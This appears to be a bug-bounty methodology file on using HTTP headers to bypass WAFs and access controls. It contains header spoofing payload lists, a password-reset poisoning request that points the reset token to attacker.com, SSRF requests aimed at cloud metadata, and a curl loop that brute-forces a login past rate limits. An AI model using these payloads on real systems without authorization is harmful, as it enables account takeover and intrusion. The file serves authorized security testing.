---
name: "waf-bypass-headers"
version: "2.0"
category: "auth"
subcategory: "header-injection"
phase: "exploitation"
tags: ["bug-bounty", "auth", "header-injection", "waf-bypass", "ip-spoofing", "host-injection"]
tools: ["curl", "burp-suite", "ffuf", "python3", "netcat"]
follow_up_skills: ["host-header-injection", "403-bypass", "admin-panel-bypass", "xss", "sqli"]
prerequisite_skills: ["host-header-injection", "waf-bypass"]
description: "Bug bounty skill: waf bypass headers - exploitation phase, auth category"
---
# WAF Bypass Using Headers

## Summary

Manipulating HTTP headers can bypass WAF rules, spoof IP addresses, poison password reset links, exploit open redirects, and trigger SSRF. Many applications trust headers like `X-Forwarded-Host`, `X-Forwarded-For`, and `X-Real-IP` without validation, allowing attackers to impersonate trusted sources or internal IPs.

## Common Headers for WAF Bypass

### IP Spoofing Headers

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For-Original: 127.0.0.1
X-Forwarder-For: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Real-Ip: 127.0.0.1
X-Original-Remote-Addr: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
Proxy-Host: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
```

### Host / Origin Manipulation

```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Host: 127.0.0.1
Host: attacker.com
Origin: null
nullOrigin: [siteDomain].attacker.com
```

### Scheme / Port / URL Manipulation

```
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-HTTP-Method-Override: PUT
Base-Url: 127.0.0.1
Http-Url: 127.0.0.1
Proxy-Url: 127.0.0.1
X-Proxy-Url: 127.0.0.1
X-Http-Destinationurl: 127.0.0.1
X-Http-Host-Override: 127.0.0.1
Request-Uri: 127.0.0.1
Uri: 127.0.0.1
Url: 127.0.0.1
```

### Redirect / Referer Headers

```
X-Frame-Options: Allow
Redirect: 127.0.0.1
Referer: 127.0.0.1
Referrer: 127.0.0.1
Refferer: 127.0.0.1
```

## Password Reset Poisoning

If the application uses `Host`, `X-Forwarded-Host`, or similar headers to construct password reset links, an attacker can poison the link to point to their domain.

```http
POST /reset-password HTTP/1.1
Host: victim-site.com
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

email=victim@victim.com
```

If the server reflects `X-Forwarded-Host` into the reset link, the victim receives:

```
https://attacker.com/reset?token=abcdef123456
```

When the victim clicks the link, the attacker captures the token and can reset the victim's password.

**See also**: `Knowledge/Vulnerabilities/Host_Header_Injection.md` for detailed password reset poisoning methodology.

## IP Restriction Bypass

Many applications restrict admin panels or internal endpoints to trusted IPs. Adding IP spoofing headers can bypass these restrictions:

```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 192.168.1.100
X-Real-IP: 192.168.1.100
Client-IP: 192.168.1.100
```

Tip: Try `127.0.0.1`, `localhost`, `0.0.0.0`, internal CIDR ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

**See also**: `Knowledge/Vulnerabilities/Admin_Panel_Bypass.md` for IP allowlist bypass testing.

## SSRF via Headers

If an application fetches resources based on headers, an attacker can target internal services:

```http
GET /api/v1/fetch HTTP/1.1
Host: target.com
X-Forwarded-For: 169.254.169.254
X-Real-IP: 169.254.169.254
```

This targets the AWS metadata service at `169.254.169.254`. Also test internal IPs for Redis, Memcached, internal APIs, etc.

**See also**: `Knowledge/Vulnerabilities/SSRF.md` for SSRF exploitation methodology.

## Open Redirect via Headers

Applications using `Referer`, `Redirect`, or `X-Forwarded-Host` to construct redirect URLs can be exploited:

```http
GET /login?redirect=https://victim.com HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

**See also**: `Knowledge/Vulnerabilities/Open_Redirects.md` for open redirect exploitation.

## Rate Limit Bypass

Rotate `X-Forwarded-For` with each request to bypass IP-based rate limiting:

```bash
for ip in $(seq 1 100); do
  curl -H "X-Forwarded-For: 192.168.1.$ip" -X POST -d "username=admin&password=test" https://target.com/login
done
```

**See also**: `Knowledge/Vulnerabilities/Authorization_Session_Management.md` for rate limiting bypass techniques.

## Cache Poisoning via Headers

Keyless headers like `X-Forwarded-Host`, `X-Forwarded-Scheme`, and `X-Original-URL` can be used to poison cached responses. A poisoned cache serves malicious content to all users.

**See also**: `Knowledge/Vulnerabilities/Cache_Poisoning_Deception.md` for cache poisoning methodology.

## Not a Finding If

- The application does not reflect or act on any of the manipulated headers
- Reverse proxies are correctly configured to strip untrusted headers from external requests
- CDN/WAF is configured to override or validate these headers at the edge

## Notes

- Combining multiple headers often yields better results — e.g., `X-Forwarded-For` + `X-Real-IP` + `Client-IP` all at once
- Some frameworks (e.g., Rails, Django) have built-in trusted proxy settings — test both with and without headers
- Headers are often case-insensitive, but some servers parse only lowercase or specific casing — test variations
- `X-Original-URL` and `X-Rewrite-URL` are commonly used by IIS and Apache mod_proxy for internal path rewriting — useful for accessing endpoints the WAF blocks (e.g., `/admin`)

## References

- https://portswigger.net/web-security/ssrf
- https://portswigger.net/web-security/host-header
- https://portswigger.net/kb/issues/00200300_open-redification-dom-based
- https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
